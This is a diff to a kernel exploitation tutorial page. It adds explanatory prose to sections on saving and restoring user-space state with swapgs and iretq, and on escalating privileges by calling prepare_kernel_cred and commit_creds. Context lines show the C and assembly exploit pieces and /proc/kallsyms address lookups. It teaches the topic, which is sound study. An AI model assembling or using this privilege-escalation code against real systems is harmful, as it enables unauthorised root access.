@@ -81,7 +81,8 @@ Anvbis
 <h2 id=return-to-user-space-overview>Return to User-space Overview<a href=#return-to-user-space-overview class=hanchor arialabel=Anchor>&#8983;</a> </h2>
 <p>&mldr;</p>
 <h2 id=saving-the-initial-state>Saving the Initial State<a href=#saving-the-initial-state class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>&mldr;</p>
+<p>Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the <code>iretq</code> instruction will use the information saved below in order to return to user-space.</p>
+<p>We save the required registers with the assembly code below in order to build our <code>iret</code> frame to later exit kernel-space.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> save_ss, save_sp, save_rf, save_cs;
 
 <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>save_user_space</span>()
@@ -98,7 +99,9 @@ Anvbis
     );
 }
 </code></pre></div><h2 id=restoring-the-initial-state>Restoring the Initial State<a href=#restoring-the-initial-state class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>&mldr;</p>
+<p>In order to restore the initial state and return to user-space we require two instructions, <code>swapgs</code> and <code>iretq</code>. In x86_64 systems the <code>swapgs</code> instruction must be made before the <code>iretq</code> instruction as it swaps the <code>gs</code> register between kernel-mode and user-mode.</p>
+<p>We next build our <code>iret</code> frame, containing the information required to return to user-space by pushing our saved user-space registers onto the top of the stack. Finally we make our <code>iretq</code> instruction to return from kernel-space.</p>
+<p>Note: At the very top of our <code>iret</code> frame we put the address we want to return to.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>load_user_space</span>(<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> target)
 {
     <span style=color:#75715e>/* return to user-space */</span>
@@ -121,19 +124,21 @@ Anvbis
     );
 }
 </code></pre></div><h2 id=escalating-privileges-in-the-kernel>Escalating Privileges in the Kernel<a href=#escalating-privileges-in-the-kernel class=hanchor arialabel=Anchor>&#8983;</a> </h2>
-<p>&mldr;</p>
+<p>Escalating privileges inside kernel-space is done via two function calls, <code>prepare_kernel_cred</code> and <code>commit_creds</code>.</p>
+<p>The <code>prepare_kernel_cred</code> function call creates a credentials struct for whatever uid is provided to it (this will almost always be &lsquo;0&rsquo;, for the root user). The <code>commit_creds</code> function call takes whatever credentials struct is provided to it and applies those privileges to the current user.</p>
+<p>We can find the address (in kernel-space) of both these functions by reading the <code>/proc/kallsyms</code> file.</p>
 <pre><code>/ # cat /proc/kallsyms | grep prepare_kernel_cred
 ffffffff810881c0 T prepare_kernel_cred
 / # cat /proc/kallsyms | grep commit_creds
 ffffffff81087e80 T commit_creds
-</code></pre><p>&mldr;</p>
+</code></pre><p>Using the addresses we found earlier, we can write a bit of assembly that escalates our privileges to that of the root user.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=color:#a6e22e>xor</span>    <span style=color:#66d9ef>rdi</span>, <span style=color:#66d9ef>rdi</span>
 <span style=color:#a6e22e>movabs</span> <span style=color:#66d9ef>rbx</span>, <span style=color:#ae81ff>0xffffffff810881c0</span>  <span style=color:#960050;background-color:#1e0010>//</span> <span style=color:#66d9ef>prepare_kernel_cred</span>
 <span style=color:#a6e22e>call</span>   <span style=color:#66d9ef>rbx</span>
 <span style=color:#a6e22e>movabs</span> <span style=color:#66d9ef>rbx</span>, <span style=color:#ae81ff>0xffffffff81087e80</span>  <span style=color:#960050;background-color:#1e0010>//</span> <span style=color:#66d9ef>commit_creds</span>
 <span style=color:#a6e22e>mov</span>    <span style=color:#66d9ef>rdi</span>, <span style=color:#66d9ef>rax</span>
 <span style=color:#a6e22e>call</span>   <span style=color:#66d9ef>rbx</span>
-</code></pre></div><p>&mldr;</p>
+</code></pre></div><p>Let&rsquo;s place this inside a function so we can easily use it within our final exploit.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>escalate_privileges</span>()
 {
     <span style=color:#75715e>/* escalate privileges */</span>
